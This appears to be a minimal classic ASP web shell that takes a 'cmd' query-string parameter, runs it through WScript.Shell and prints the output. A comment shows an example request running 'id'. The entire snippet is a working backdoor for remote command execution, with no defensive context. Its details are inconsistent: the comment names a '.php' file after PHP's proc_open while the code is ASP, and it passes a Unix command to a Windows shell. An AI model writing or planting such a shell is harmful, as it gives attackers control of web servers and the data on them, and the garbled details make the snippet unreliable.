// This will only work if the server is configured to allow script execution.
// Execution: http://example.com/webshell_proc_open.php?cmd=id

<%
cmd = Request.QueryString("cmd")
Set o = CreateObject("WScript.Shell")
Set e = o.Exec(cmd)
Response.Write(e.StdOut.ReadAll())
%>